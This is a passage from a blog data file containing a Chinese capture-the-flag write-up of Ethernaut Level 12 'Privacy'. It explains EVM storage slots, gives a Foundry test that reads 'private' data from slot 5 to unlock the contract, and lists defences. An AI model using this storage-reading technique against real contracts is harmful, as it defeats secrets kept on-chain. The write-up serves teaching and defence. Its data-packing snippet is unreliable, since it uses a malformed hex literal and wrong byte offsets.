\n    function unlock(bytes16 _key) public {\n        require(_key == bytes16(secretData[2]));\n        // unlock logic\n    }\n}\n\n// ✅ 安全：使用哈希验证\ncontract SecureContract {\n    bytes32 private dataHash;  // 存储哈希而不是明文\n    \n    constructor(bytes32 _data) {\n        dataHash = keccak256(abi.encodePacked(_data));\n    }\n    \n    function unlock(bytes32 _data) public {\n        require(keccak256(abi.encodePacked(_data)) == dataHash);\n        // unlock logic\n    }\n}\n```\n\n### 2. 使用承诺-揭示方案\n\n```solidity\ncontract CommitReveal {\n    mapping(address => bytes32) private commitments;\n    mapping(address => bool) private revealed;\n    \n    // 第一阶段：提交哈希\n    function commit(bytes32 _hashedData) public {\n        commitments[msg.sender] = _hashedData;\n    }\n    \n    // 第二阶段：揭示并验证\n    function reveal(bytes32 _data, uint256 _nonce) public {\n        bytes32 hash = keccak256(abi.encodePacked(_data, _nonce));\n        require(commitments[msg.sender] == hash, \"Invalid reveal\");\n        revealed[msg.sender] = true;\n    }\n}\n```\n\n## 🔧 相关工具和技术\n\n### 存储布局分析工具\n\n```bash\n# 使用 forge inspect 查看存储布局\nforge inspect <ContractName> storage-layout\n\n# 使用 cast 读取存储\ncast storage <CONTRACT_ADDRESS> <SLOT_NUMBER>\n\n# 使用 web3.py 读取存储\nfrom web3 import Web3\nw3 = Web3(Web3.HTTPProvider('http://localhost:8545'))\ndata = w3.eth.get_storage_at(contract_address, 5)\n```\n\n### 数据类型转换\n\n```solidity\n// bytes32 到 bytes16 转换\nbytes32 fullData = 0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef;\nbytes16 halfData = bytes16(fullData);  // 取前16个字节\n\n// 数据打包解析\nbytes32 packedData = 0x000000000000000000000000000a00ff0000000000000000000000000000;\nuint8 flattening = uint8(packedData);           // 最后1字节\nuint8 denomination = uint8(packedData >> 8);    // 倒数2字节  \nuint16 awkwardness = uint16(packedData >> 16);  // 倒数3-4字节\n```\n\n## 🎯 总结\n\n**核心概念**:\n- 同样，链上是没有隐私。一切都是公开的，任何人都可以阅读\n- 合理安排你的存储空间，可以节省 gas\n- EVM 使用 32 字节的存储槽，小于 32 字节的类型会被打包\n\n**攻击向量**:\n- 通过存储布局分析找到目标数据的 slot 位置\n- 使用 RPC 调用或 Foundry cheatcodes 读取数据\n- 正确处理数据类型转换和数据打包\n\n**防御策略**:\n- 永远不要在链上存储明文敏感数据\n- 使用哈希、承诺方案或链下验证\n- 考虑使用加密存储解决方案\n- 合理设计存储布局以提高效率\n\n## 📚 参考资料\n\n- [Private data](https://solidity-by-example.org/hacks/accessing-private-data/)\n- [EVM storage](https://programtheblockchain.com/posts/2018/03/09/understanding-ethereum-smart-contract-storage/)\n- [Storage layout](https://docs.soliditylang.org/en/latest/internals/layout_in_storage.html)\n\n","source":"_posts/ethernaut-level-12-privacy.md","raw":"---\ntitle: 'Ethernaut Level 12: Privacy - 存储布局分析'\ndate: 2025-01-25 16:00:00\nupdated: 2025-01-25 16:00:00\ncategories:\n  - Ethernaut 系列\n  - 进阶攻击篇 (11-20)\ntags:\n  - Ethernaut\n  - Foundry\n  - 存储布局分析\n  - 私有变量读取\n  - 智能合约安全\n  - Solidity\n  - EVM存储\nseries: Ethernaut Foundry Solutions\nexcerpt: \"深入学习 EVM 存储布局和复杂数据结构的存储机制，掌握 Privacy 关卡的攻击技术。理解静态数组、数据打包和存储槽位计算。\"\n---\n\n# 🎯 Ethernaut Level 12: Privacy - 存储布局分析\n\n> **关卡链接**: [Ethernaut Level 12 - Privacy](https://ethernaut.openzeppelin.com/level/12)  \n> **攻击类型**: 存储布局分析  \n> **难度**: ⭐⭐⭐⭐☆\n\n## 📋 挑战目标\n\n要读取 `private` 数据，然后调用 `unlock` 函数。这个关卡进一步考验对 EVM 存储布局的理解，特别是静态数组和数据打包的处理。\n\n![Privacy Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel12.svg)\n\n## 🔍 漏洞分析\n\n### 目标函数分析\n\n```solidity\nfunction unlock(bytes16 _key) public {\n    require(_key == bytes16(data[2]));  // 需要 data[2] 的 bytes16 版本\n    locked = false;\n}\n```\n\n我们可以看到，此处的条件是 `_key` 必须等于 `bytes16(data[2])`。那么我们如何访问 `data[2]` 呢？\n\n### 复杂存储布局分析\n\n合约的状态变量：\n\n```solidity\nbool public locked = true;\nuint256 public ID = block.timestamp;\nuint8 private flattening = 10;\nuint8 private denomination = 255;\nuint16 private awkwardness = uint16(block.timestamp);\nbytes32[3] private data;\n```\n\n由于没有继承，存储从 slot 0 开始，带有 `locked` 变量，如下所示：\n\n| Slot | Variable | Type | Size | Notes |\n|------|----------|------|------|-------|\n| 0 | `locked` | `bool` | 1 byte | `locked` 占用1个字节，但由于下一个值不适合剩下的31个字节，`locked` 占用了整个插槽 |\n| 1 | `ID` | `uint256` | 32 bytes | `uint256` 占用32字节，所以是1个满槽 |\n| 2 | `flattening`<br/>`denomination`<br/>`awkwardness` | `uint8`<br/>`uint8`<br/>`uint16` | 1+1+2 bytes | 分别是1个字节+1个字节+2个字节，Solidity将它们打包到一个插槽中 |\n| 3 | `data[0]` | `bytes32` | 32 bytes | 静态数组启动一个新的存储槽，每个 `bytes32` 元素占用一个完整的槽 |\n| 4 | `data[1]` | `bytes32` | 32 bytes | |\n| 5 | `data[2]` | `bytes32` | 32 bytes | **这个槽位就是 `data[2]`** |\n\n通过这个详细的存储布局，我们可以看到 `data[2]` 存储在 slot 5 中。\n\n## 💻 Foundry 实现\n\n### 攻击合约代码\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"../src/Ethernaut.sol\";\nimport \"../src/levels/PrivacyFactory.sol\";\n\ncontract PrivacyTest is Test {\n    Ethernaut ethernaut;\n    PrivacyFactory privacyFactory;\n    \n    function setUp() public {\n        ethernaut = new Ethernaut();\n        privacyFactory = new PrivacyFactory();\n        ethernaut.registerLevel(privacyFactory);\n    }\n    \n    function testPrivacyExploit() public {\n        // 创建关卡实例\n        address levelInstance = ethernaut.createLevelInstance(privacyFactory);\n        Privacy instance = Privacy(levelInstance);\n        \n        // 验证初始状态\n        assertEq(instance.locked(), true);\n        \n        // 攻击：读取 slot 5 中的 data[2]\n        bytes32 data2 = vm.load(address(instance), bytes32(uint256(5)));\n        \n        // 转换为 bytes16 并解锁\n        bytes16 key = bytes16(data2);\n        instance.unlock(key);\n        \n        // 验证攻击成功\n        assertEq(instance.locked(), false);\n        \n        // 提交关卡\n        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(\n            payable(levelInstance)\n        );\n        assert(levelSuccessfullyPassed);\n    }\n    \n    // 额外测试：验证存储布局\n    function testStorageLayout() public {\n        address levelInstance = ethernaut.createLevelInstance(privacyFactory);\n        \n        // 检查各个 slot 的内容\n        bytes32 slot0 = vm.load(address(levelInstance), bytes32(uint256(0))); // locked\n        bytes32 slot1 = vm.load(address(levelInstance), bytes32(uint256(1))); // ID\n        bytes32 slot2 = vm.load(address(levelInstance), bytes32(uint256(2))); // packed variables\n        bytes32 slot3 = vm.load(address(levelInstance), bytes32(uint256(3))); // data[0]\n        bytes32 slot4 = vm.load(address(levelInstance), bytes32(uint256(4))); // data[1]\n        bytes32 slot5 = vm.load(address(levelInstance), bytes32(uint256(5))); // data[2]\n        \n        console.log(\"Slot 0 (locked):\", uint256(slot0));\n        console.log(\"Slot 1 (ID):\", uint256(slot1));\n        console.log(\"Slot 2 (packed):\");\n        console.logBytes32(slot2);\n        console.log(\"Slot 3 (data[0]):\");\n        console.logBytes32(slot3);\n        console.log(\"Slot 4 (data[1]):\");\n        console.logBytes32(slot4);\n        console.log(\"Slot 5 (data[2]):\");\n        console.logBytes32(slot5);\n    }\n}\n```\n\n### 关键攻击步骤\n\n1. **分析存储布局**：确定 `data[2]` 存储在 slot 5\n2. **读取存储**：使用 `vm.load()` 读取 slot 5 的数据\n3. **数据转换**：将 `bytes32` 转换为 `bytes16`\n4. **调用 unlock**：使用转换后的 key 解锁合约\n\n```solidity\n// 读取 slot 5 中的 data[2]\nbytes32 data2 = vm.load(address(instance), bytes32(uint256(5)));\n\n// 转换为 bytes16\nbytes16 key = bytes16(data2);  // 取前16个字节\n\n// 解锁合约\ninstance.unlock(key);\n```\n\n## 🛡️ 防御措施\n\n### 1. 不要在链上存储敏感数据\n\n```solidity\n// ❌ 不安全：私有数据存储在链上\ncontract VulnerableContract {\n    bytes32[3] private secretData;  // 仍然可以被读取！\n    \n    function unlock(bytes16 _key) public {\n        require(_key == bytes16(secretData[2]));\n        // unlock logic\n    }\n}\n\n// ✅ 安全：使用哈希验证\ncontract SecureContract {\n    bytes32 private dataHash;  // 存储哈希而不是明文\n    \n    constructor(bytes32 _data) {\n        dataHash = keccak256(abi.encodePacked(_data));\n    }\n    \n    function unlock(bytes32 _data) public {\n        require(keccak256(abi.encodePacked(_data)) == dataHash);\n        // unlock logic\n    }\n}\n```\n\n### 2. 使用承诺-揭示方案\n\n```solidity\ncontract CommitReveal {\n    mapping(address => bytes32) private commitments;\n    mapping(address => bool) private revealed;\n    \n    // 第一阶段：提交哈希\n    function commit(bytes32 _hashedData) public {\n        commitments[msg.sender] = _hashedData;\n    }\n    \n    // 第二阶段：揭示并验证\n    function reveal(bytes32 _data, uint256 _nonce) public {\n        bytes32 hash = keccak256(abi.encodePacked(_data, _nonce));\n        require(commitments[msg.sender] == hash, \"Invalid reveal\");\n        revealed[msg.sender] = true;\n    }\n}\n```\n\n## 🔧 相关工具和技术\n\n### 存储布局分析工具\n\n```bash\n# 使用 forge inspect 查看存储布局\nforge inspect <ContractName> storage-layout\n\n# 使用 cast 读取存储\ncast storage <CONTRACT_ADDRESS> <SLOT_NUMBER>\n\n# 使用 web3.py 读取存储\nfrom web3 import Web3\nw3 = Web3(Web3.HTTPProvider('http://localhost:8545'))\ndata = w3.eth.get_storage_at(contract_address, 5)\n```\n\n### 数据类型转换\n\n```solidity\n// bytes32 到 bytes16 转换\nbytes32 fullData = 0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef;\nbytes16 halfData = bytes16(fullData);  // 取前16个字节\n\n// 数据打包解析\nbytes32 packedData = 0x000000000000000000000000000a00ff0000000000000000000000000000;\nuint8 flattening = uint8(packedData);           // 最后1字节\nuint8 denomination = uint8(packedData >> 8);    // 倒数2字节  \nuint16 awkwardness = uint16(packedData >> 16);  // 倒数3-4字节\n```\n\n## 🎯 总结\n\n**核心概念**:\n- 同样，链上是没有隐私。一切都是公开的，任何人都可以阅读\n- 合理安排你的存储空间，可以节省 gas\n- EVM 使用 32 字节的存储槽，小于 32 字节的类型会被打包\n\n**攻击向量**:\n- 通过存储布局分析找到目标数据的 slot 位置\n- 使用 RPC 调用或 Foundry cheatcodes 读取数据\n- 正确处理数据类型转换和数据打包\n\n**防御策略**:\n- 永远不要在链上存储明文敏感数据\n- 使用哈希、承诺方案或链下验证\n- 考虑使用加密存储解决方案\n- 合理设计存储布局以提高效率\n\n## 📚 参考资料\n\n- [Private data](https://solidity-by-example.org/hacks/accessing-private-data/)\n- [EVM storage](https://programtheblockchain.com/posts/2018/03/09/understanding-ethereum-smart-contract-storage/)\n- [Storage layout](https://docs.soliditylang.org/en/latest/internals/layout_in_storage.html)\n\n","slug":"ethernaut-level-12-privacy","published":1,"comments":1,"layout":"post","photos":[],"_id":"cmfc7zbpb000zbf5qahyqe0h8","content":"<h1 id=\"🎯-Ethernaut-Level-12-Privacy-存储布局分析\"><a href=\"#🎯-Ethernaut-Level-12-Privacy-存储布局分析\" class=\"headerlink\" title=\"🎯 Ethernaut Level 12: Privacy - 存储布局分析\"></a>🎯 Ethernaut Level 12: Privacy - 存储布局分析</h1><blockquote>\n<p><strong>关卡链接</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/12\">Ethernaut Level 12 - Privacy</a><br><strong>攻击类型</strong>: 存储布局分析<br><strong>难度</strong>: ⭐⭐⭐⭐☆</p>\n</blockquote>\n<h2 id=\"📋-挑战目标\"><a href=\"#📋-挑战目标\" class=\"headerlink\" title=\"📋 挑战目标\"></a>📋 挑战目标</h2><p>要读取 <code>private</code> 数据，然后调用 <code>unlock</code> 函数。这个关卡进一步考验对 EVM 存储布局的理解，特别是静态数组和数据打包的处理。</p>\n<p><img src=\"https://ethernaut.openzeppelin.com/imgs/BigLevel12.svg\" alt=\"Privacy Requirements\"></p>\n<h2 id=\"🔍-漏洞分析\"><a href=\"#🔍-漏洞分析\" class=\"headerlink\" title=\"🔍 漏洞分析\"></a>🔍 漏洞分析</h2><h3 id=\"目标函数分析\"><a href=\"#目标函数分析\" class=\"headerlink\" title=\"目标函数分析\"></a>目标函数分析</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function unlock(bytes16 _key) public &#123;</span><br><span class=\"line\">    require(_key == bytes16(data[2]));  // 需要 data[2] 的 bytes16 版本</span><br><span class=\"line\">    locked = false;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>我们可以看到，此处的条件是 <code>_key</code> 必须等于 <code>bytes16(data[2])</code>。那么我们如何访问 <code>data[2]</code> 呢？</p>\n<h3 id=\"复杂存储布局分析\"><a href=\"#复杂存储布局分析\" class=\"headerlink\" title=\"复杂存储布局分析\"></a>复杂存储布局分析</h3><p>合约的状态变量：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bool public locked = true;</span><br><span class=\"line\">uint256 public ID = block.timestamp;</span><br><span class=\"line\">uint8 private flattening = 10;</span><br><span class=\"line\">uint8 private denomination = 255;</span><br><span class=\"line\">uint16 private awkwardness = uint16(block.timestamp);</span><br><span class=\"line\">bytes32[3] private data;</span><br></pre></td></tr></table></figure>\n\n<p>由于没有继承，存储从 slot 0 开始，带有 <code>locked</code> 变量，如下所示：</p>\n<table>\n<thead>\n<tr>\n<th>Slot</th>\n<th>Variable</th>\n<th>Type</th>\n<th>Size</th>\n<th>Notes</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>0</td>\n<td><code>locked</code></td>\n<td><code>bool</code></td>\n<td>1 byte</td>\n<td><code>locked</code> 占用1个字节，但由于下一个值不适合剩下的31个字节，<code>locked</code> 占用了整个插槽</td>\n</tr>\n<tr>\n<td>1</td>\n<td><code>ID</code></td>\n<td><code>uint256</code></td>\n<td>32 bytes</td>\n<td><code>uint256</code> 占用32字节，所以是1个满槽</td>\n</tr>\n<tr>\n<td>2</td>\n<td><code>flattening</code><br/><code>denomination</code><br/><code>awkwardness</code></td>\n<td><code>uint8</code><br/><code>uint8</code><br/><code>uint16</code></td>\n<td>1+1+2 bytes</td>\n<td>分别是1个字节+1个字节+2个字节，Solidity将它们打包到一个插槽中</td>\n</tr>\n<tr>\n<td>3</td>\n<td><code>data[0]</code></td>\n<td><code>bytes32</code></td>\n<td>32 bytes</td>\n<td>静态数组启动一个新的存储槽，每个 <code>bytes32</code> 元素占用一个完整的槽</td>\n</tr>\n<tr>\n<td>4</td>\n<td><code>data[1]</code></td>\n<td><code>bytes32</code></td>\n<td>32 bytes</td>\n<td></td>\n</tr>\n<tr>\n<td>5</td>\n<td><code>data[2]</code></td>\n<td><code>bytes32</code></td>\n<td>32 bytes</td>\n<td><strong>这个槽位就是 <code>data[2]</code></strong></td>\n</tr>\n</tbody></table>\n<p>通过这个详细的存储布局，我们可以看到 <code>data[2]</code> 存储在 slot 5 中。</p>\n<h2 id=\"💻-Foundry-实现\"><a href=\"#💻-Foundry-实现\" class=\"headerlink\" title=\"💻 Foundry 实现\"></a>💻 Foundry 实现</h2><h3 id=\"攻击合约代码\"><a href=\"#攻击合约代码\" class=\"headerlink\" title=\"攻击合约代码\"></a>攻击合约代码</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;../src/Ethernaut.sol&quot;;</span><br><span class=\"line\">import &quot;../src/levels/PrivacyFactory.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract PrivacyTest is Test &#123;</span><br><span class=\"line\">    Ethernaut ethernaut;</span><br><span class=\"line\">    PrivacyFactory privacyFactory;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        ethernaut = new Ethernaut();</span><br><span class=\"line\">        privacyFactory = new PrivacyFactory();</span><br><span class=\"line\">        ethernaut.registerLevel(privacyFactory);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function testPrivacyExploit() public &#123;</span><br><span class=\"line\">        // 创建关卡实例</span><br><span class=\"line\">        address levelInstance = ethernaut.createLevelInstance(privacyFactory);</span><br><span class=\"line\">        Privacy instance = Privacy(levelInstance);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 验证初始状态</span><br><span class=\"line\">        assertEq(instance.locked(), true);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 攻击：读取 slot 5 中的 data[2]</span><br><span class=\"line\">        bytes32 data2 = vm.load(address(instance), bytes32(uint256(5)));</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 转换为 bytes16 并解锁</span><br><span class=\"line\">        bytes16 key = bytes16(data2);</span><br><span class=\"line\">        instance.unlock(key);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 验证攻击成功</span><br><span class=\"line\">        assertEq(instance.locked(), false);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 提交关卡</span><br><span class=\"line\">        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(</span><br><span class=\"line\">            payable(levelInstance)</span><br><span class=\"line\">        );</span><br><span class=\"line\">        assert(levelSuccessfullyPassed);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // 额外测试：验证存储布局</span><br><span class=\"line\">    function testStorageLayout() public &#123;</span><br><span class=\"line\">        address levelInstance = ethernaut.createLevelInstance(privacyFactory);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 检查各个 slot 的内容</span><br><span class=\"line\">        bytes32 slot0 = vm.load(address(levelInstance), bytes32(uint256(0))); // locked</span><br><span class=\"line\">        bytes32 slot1 = vm.load(address(levelInstance), bytes32(uint256(1))); // ID</span><br><span class=\"line\">        bytes32 slot2 = vm.load(address(levelInstance), bytes32(uint256(2))); // packed variables</span><br><span class=\"line\">        bytes32 slot3 = vm.load(address(levelInstance), bytes32(uint256(3))); // data[0]</span><br><span class=\"line\">        bytes32 slot4 = vm.load(address(levelInstance), bytes32(uint256(4))); // data[1]</span><br><span class=\"line\">        bytes32 slot5 = vm.load(address(levelInstance), bytes32(uint256(5))); // data[2]</span><br><span class=\"line\">        </span><br><span class=\"line\">        console.log(&quot;Slot 0 (locked):&quot;, uint256(slot0));</span><br><span class=\"line\">        console.log(&quot;Slot 1 (ID):&quot;, uint256(slot1));</span><br><span class=\"line\">        console.log(&quot;Slot 2 (packed):&quot;);</span><br><span class=\"line\">        console.logBytes32(slot2);</span><br><span class=\"line\">        console.log(&quot;Slot 3 (data[0]):&quot;);</span><br><span class=\"line\">        console.logBytes32(slot3);</span><br><span class=\"line\">        console.log(&quot;Slot 4 (data[1]):&quot;);</span><br><span class=\"line\">        console.logBytes32(slot4);</span><br><span class=\"line\">        console.log(&quot;Slot 5 (data[2]):&quot;);</span><br><span class=\"line\">        console.logBytes32(slot5);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"关键攻击步骤\"><a href=\"#关键攻击步骤\" class=\"headerlink\" title=\"关键攻击步骤\"></a>关键攻击步骤</h3><ol>\n<li><strong>分析存储布局</strong>：确定 <code>data[2]</code> 存储在 slot 5</li>\n<li><strong>读取存储</strong>：使用 <code>vm.load()</code> 读取 slot 5 的数据</li>\n<li><strong>数据转换</strong>：将 <code>bytes32</code> 转换为 <code>bytes16</code></li>\n<li><strong>调用 unlock</strong>：使用转换后的 key 解锁合约</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 读取 slot 5 中的 data[2]</span><br><span class=\"line\">bytes32 data2 = vm.load(address(instance), bytes32(uint256(5)));</span><br><span class=\"line\"></span><br><span class=\"line\">// 转换为 bytes16</span><br><span class=\"line\">bytes16 key = bytes16(data2);  // 取前16个字节</span><br><span class=\"line\"></span><br><span class=\"line\">// 解锁合约</span><br><span class=\"line\">instance.unlock(key);</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"🛡️-防御措施\"><a href=\"#🛡️-防御措施\" class=\"headerlink\" title=\"🛡️ 防御措施\"></a>🛡️ 防御措施</h2><h3 id=\"1-不要在链上存储敏感数据\"><a href=\"#1-不要在链上存储敏感数据\" class=\"headerlink\" title=\"1. 不要在链上存储敏感数据\"></a>1. 不要在链上存储敏感数据</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ❌ 不安全：私有数据存储在链上</span><br><span class=\"line\">contract VulnerableContract &#123;</span><br><span class=\"line\">    bytes32[3] private secretData;  // 仍然可以被读取！</span><br><span class=\"line\">    </span><br><span class=\"line\">    function unlock(bytes16 _key) public &#123;</span><br><span class=\"line\">        require(_key == bytes16(secretData[2]));</span><br><span class=\"line\">        // unlock logic</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// ✅ 安全：使用哈希验证</span><br><span class=\"line\">contract SecureContract &#123;</span><br><span class=\"line\">    bytes32 private dataHash;  // 存储哈希而不是明文</span><br><span class=\"line\">    </span><br><span class=\"line\">    constructor(bytes32 _data) &#123;</span><br><span class=\"line\">        dataHash = keccak256(abi.encodePacked(_data));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function unlock(bytes32 _data) public &#123;</span><br><span class=\"line\">        require(keccak256(abi.encodePacked(_data)) == dataHash);</span><br><span class=\"line\">        // unlock logic</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-使用承诺-揭示方案\"><a href=\"#2-使用承诺-揭示方案\" class=\"headerlink\" title=\"2. 使用承诺-揭示方案\"></a>2. 使用承诺-揭示方案</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract CommitReveal &#123;</span><br><span class=\"line\">    mapping(address =&gt; bytes32) private commitments;</span><br><span class=\"line\">    mapping(address =&gt; bool) private revealed;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // 第一阶段：提交哈希</span><br><span class=\"line\">    function commit(bytes32 _hashedData) public &#123;</span><br><span class=\"line\">        commitments[msg.sender] = _hashedData;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // 第二阶段：揭示并验证</span><br><span class=\"line\">    function reveal(bytes32 _data, uint256 _nonce) public &#123;</span><br><span class=\"line\">        bytes32 hash = keccak256(abi.encodePacked(_data, _nonce));</span><br><span class=\"line\">        require(commitments[msg.sender] == hash, &quot;Invalid reveal&quot;);</span><br><span class=\"line\">        revealed[msg.sender] = true;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"🔧-相关工具和技术\"><a href=\"#🔧-相关工具和技术\" class=\"headerlink\" title=\"🔧 相关工具和技术\"></a>🔧 相关工具和技术</h2><h3 id=\"存储布局分析工具\"><a href=\"#存储布局分析工具\" class=\"headerlink\" title=\"存储布局分析工具\"></a>存储布局分析工具</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 使用 forge inspect 查看存储布局</span></span><br><span class=\"line\">forge inspect &lt;ContractName&gt; storage-layout</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 使用 cast 读取存储</span></span><br><span class=\"line\">cast storage &lt;CONTRACT_ADDRESS&gt; &lt;SLOT_NUMBER&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 使用 web3.py 读取存储</span></span><br><span class=\"line\">from web3 import Web3</span><br><span class=\"line\">w3 = Web3(Web3.HTTPProvider(<span class=\"string\">&#x27;http://localhost:8545&#x27;</span>))</span><br><span class=\"line\">data = w3.eth.get_storage_at(contract_address, 5)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"数据类型转换\"><a href=\"#数据类型转换\" class=\"headerlink\" title=\"数据类型转换\"></a>数据类型转换</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// bytes32 到 bytes16 转换</span><br><span class=\"line\">bytes32 fullData = 0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef;</span><br><span class=\"line\">bytes16 halfData = bytes16(fullData);  // 取前16个字节</span><br><span class=\"line\"></span><br><span class=\"line\">// 数据打包解析</span><br><span class=\"line\">bytes32 packedData = 0x000000000000000000000000000a00ff0000000000000000000000000000;</span><br><span class=\"line\">uint8 flattening = uint8(packedData);           // 最后1字节</span><br><span class=\"line\">uint8 denomination = uint8(packedData &gt;&gt; 8);    // 倒数2字节  </span><br><span class=\"line\">uint16 awkwardness = uint16(packedData &gt;&gt; 16);  // 倒数3-4字节</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"🎯-总结\"><a 